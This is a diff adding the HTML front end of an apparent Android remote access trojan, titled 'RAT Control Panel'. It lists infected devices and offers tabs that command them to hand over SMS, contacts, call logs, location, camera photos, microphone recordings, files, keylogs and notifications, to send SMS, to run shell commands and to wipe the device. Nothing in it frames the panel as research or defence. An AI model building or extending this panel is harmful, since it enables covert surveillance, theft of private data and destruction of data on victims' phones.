@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RAT Control Panel</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div id="app">
+  <aside id="sidebar">
+    <div class="sidebar-header">
+      <span class="logo">⚡ RAT Panel</span>
+      <span id="conn-status" class="badge offline">●  Offline</span>
+    </div>
+    <div class="device-count"><span id="dcount">0</span> device(s) online</div>
+    <div id="device-list"></div>
+  </aside>
+
+  <main id="main">
+    <div id="no-device">
+      <div class="empty-state">
+        <div class="big-icon">📱</div>
+        <p>Select a device from the sidebar</p>
+      </div>
+    </div>
+
+    <div id="device-panel" style="display:none">
+      <header class="panel-header">
+        <div>
+          <h2 id="dev-title">Device</h2>
+          <small id="dev-subtitle"></small>
+        </div>
+        <div class="btn-group">
+          <button class="btn" onclick="sendCmd('get_device_info')">📋 Info</button>
+          <button class="btn danger" onclick="confirmWipe()">🗑 Wipe</button>
+        </div>
+      </header>
+
+      <nav class="tabs">
+        <button class="tab active" data-tab="sms">SMS</button>
+        <button class="tab" data-tab="contacts">Contacts</button>
+        <button class="tab" data-tab="calls">Calls</button>
+        <button class="tab" data-tab="location">Location</button>
+        <button class="tab" data-tab="camera">Camera</button>
+        <button class="tab" data-tab="mic">Mic</button>
+        <button class="tab" data-tab="files">Files</button>
+        <button class="tab" data-tab="keylog">Keylog</button>
+        <button class="tab" data-tab="apps">Apps</button>
+        <button class="tab" data-tab="notifications">Notifications</button>
+        <button class="tab" data-tab="shell">Shell</button>
+      </nav>
+
+      <!-- SMS Tab -->
+      <div class="tab-content active" id="tab-sms">
+        <div class="toolbar">
+          <button class="btn primary" onclick="sendCmd('get_sms')">🔄 Fetch SMS</button>
+          <div class="send-sms-form">
+            <input id="sms-to" placeholder="Number" class="input">
+            <input id="sms-body" placeholder="Message" class="input">
+            <button class="btn primary" onclick="sendSMS()">📤 Send SMS</button>
+          </div>
+        </div>
+        <div id="sms-output" class="data-table-wrap"></div>
+      </div>
+
+      <!-- Contacts Tab -->
+      <div class="tab-content" id="tab-contacts">
+        <div class="toolbar">
+          <button class="btn primary" onclick="sendCmd('get_contacts')">🔄 Fetch Contacts</button>
+        </div>
+        <div id="contacts-output" class="data-table-wrap"></div>
+      </div>
+
+      <!-- Calls Tab -->
+      <div class="tab-content" id="tab-calls">
+        <div class="toolbar">
+          <button class="btn primary" onclick="sendCmd('get_calls')">🔄 Fetch Call Log</button>
+        </div>
+        <div id="calls-output" class="data-table-wrap"></div>
+      </div>
+
+      <!-- Location Tab -->
+      <div class="tab-content" id="tab-location">
+        <div class="toolbar">
+          <button class="btn primary" onclick="sendCmd('get_location')">📍 Get Location</button>
+        </div>
+        <div id="location-output"></div>
+      </div>
+
+      <!-- Camera Tab -->
+      <div class="tab-content" id="tab-camera">
+        <div class="toolbar">
+          <button class="btn primary" onclick="sendCmd('take_photo', {facing:'back'})">📷 Back Camera</button>
+          <button class="btn primary" onclick="sendCmd('take_photo', {facing:'front'})">🤳 Front Camera</button>
+        </div>
+        <div id="camera-output"></div>
+      </div>
+
+      <!-- Mic Tab -->
+      <div class="tab-content" id="tab-mic">
+        <div class="toolbar">
+          <button class="btn primary" onclick="sendCmd('start_recording')">🎙 Start Recording</button>
+          <button class="btn danger" onclick="sendCmd('stop_recording')">⏹ Stop & Fetch</button>
+        </div>
+        <div id="mic-output"></div>
+      </div>
+
+      <!-- Files Tab -->
+      <div class="tab-content" id="tab-files">
+        <div class="toolbar">
+          <input id="file-path" value="/sdcard" class="input">
+          <button class="btn primary" onclick="listFiles()">📁 List</button>
+        </div>
+        <div id="files-output" class="data-table-wrap"></div>
+      </div>
+
+      <!-- Keylog Tab -->
+      <div class="tab-content" id="tab-keylog">
+        <div class="toolbar">
+          <button class="btn primary" onclick="sendCmd('get_keylog')">⌨️ Fetch Keylog</button>
+        </div>
+        <pre id="keylog-output" class="log-box"></pre>
+      </div>
+
+      <!-- Apps Tab -->
+      <div class="tab-content" id="tab-apps">
+        <div class="toolbar">
+          <button class="btn primary" onclick="sendCmd('get_apps')">📦 Fetch Apps</button>
+        </div>
+        <div id="apps-output" class="data-table-wrap"></div>
+      </div>
+
+      <!-- Notifications Tab -->
+      <div class="tab-content" id="tab-notifications">
+        <div class="toolbar">
+          <button class="btn primary" onclick="sendCmd('get_notifications')">🔔 Fetch Notifications</button>
+        </div>
+        <pre id="notif-output" class="log-box"></pre>
+      </div>
+
+      <!-- Shell Tab -->
+      <div class="tab-content" id="tab-shell">
+        <div class="toolbar">
+          <input id="shell-cmd" placeholder="shell command..." class="input" onkeydown="if(event.key==='Enter')runShell()">
+          <button class="btn primary" onclick="runShell()">▶ Run</button>
+        </div>
+        <pre id="shell-output" class="log-box"></pre>
+      </div>
+
+    </div>
+  </main>
+</div>
+
+<script src="app.js"></script>
+</body>
+</html>
